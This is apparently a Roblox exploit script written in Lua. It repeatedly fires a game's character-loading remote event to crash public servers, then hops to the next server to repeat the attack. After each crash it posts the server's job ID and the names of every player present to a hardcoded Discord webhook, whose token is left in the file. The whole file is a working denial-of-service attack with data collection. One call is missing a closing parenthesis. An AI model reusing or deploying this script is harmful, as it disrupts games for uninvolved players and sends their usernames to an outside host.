HttpService = game:GetService("HttpService")
getgenv().BRUH = "https://discord.com/api/webhooks/1550842994494672906/" .. "aQyjLSgtuCIip9T-e1_vnXIRGQn0wOm4jyeEOGVmabCeu4e8shvmPae-npVGe8LvCWca"
PlaceId = game.PlaceId
getgenv().ServerHop = function() end
TeleportService = game:GetService("TeleportService")
Players = game.Players
LocalPlayer = game.Players.LocalPlayer
lp = game.Players.LocalPlayer
-- AFTER CRASH SETTINGS --
local alts = {
"RobloxKnightBOT_4",
"RobloxKnightBOT_8",
"RobloxKnightBOT_2"
}

local max
local min

if LocalPlayer.Name == alts[1] then
max = 16
min = 10
elseif LocalPlayer.Name == alts[2] then
max = 14
min = 10
elseif LocalPlayer.Name == alts[3] then
max = 11
min = 5
end

local interfer = false
local serverhop = true -- MOVING TO NEXT SERVER AFTER CRASHING
-------------------

local function SendWebhook(inter,altusername)
    if inter then
        http.request({
            Url = BRUH,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                content = "@everyone " .. " Found another alts : " .. altusername,
                username = game.Players.LocalPlayer.Name .. " -1 Credits"
            })
        })
        return
    end

        local HttpService = game:GetService("HttpService")
        local players = {}
    
        for _, player in ipairs(game.Players:GetPlayers()) do
            table.insert(players, player.Name)
        end
    
        local content = "🚨 SERVER INFECTED 🚨\n"
        content = content .. "🆔 Job ID: `" .. game.JobId .. "`\n"
        content = content .. "👥 Players Counts: `" .. tostring(#game.Players:GetPlayers()) .. "`\n"
        content = content .. "👥 Players: `" .. table.concat(players, ", ") .. "`"
        http.request({
            Url = BRUH,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                content = "@everyone " .. content .. " ".. game.JobId,
                username = game.Players.LocalPlayer.Name .. " +1 Credits"
            })
        })
end

if serverhop then
getgenv().ServerHop = function()
     SendWebhook(interfer)
local servers = {}
	local req = game:HttpGet("https://games.roblox.com/v1/games/" .. PlaceId .. "/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true")
	local body = HttpService:JSONDecode(req)

	if body and body.data then
		for i, v in next, body.data do
			if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing >= min and v.playing <= max and v.id ~= JobId then
				table.insert(servers, 1, v.id)
			end
		end
	end

	if #servers > 0 then
		TeleportService:TeleportToPlaceInstance(PlaceId, servers[math.random(1, #servers)], Players.LocalPlayer)
	else
		warn("no server?")
        task.delay(4,ServerHop)
	end
end
end

for i,v in next, alts do
local noob = game.Players:FindFirstChild(v)
   if noob and noob ~= LocalPlayer then
        interfer = true
   		print("found " .. v ) 
  		SendWebhook(true, tostring(v)
        ServerHop()
        break
   end
end


local function Crash()
	coroutine.wrap(function()	
		for i = 1,100 do			
			while true do
				for i = 1,100 do	
				game.ReplicatedStorage.Assets.Remotes.LoadCharacterEvent:FireServer(0)
                end
                task.wait()
			end
		end
	end)()
    coroutine.wrap(function()
while task.wait() do
b=game:GetService("GuiService"):GetErrorCode()
if b ~= Enum.ConnectionError.OK then
	task.wait(2)
	ServerHop()
	break
end
end
end)()
end

Crash()
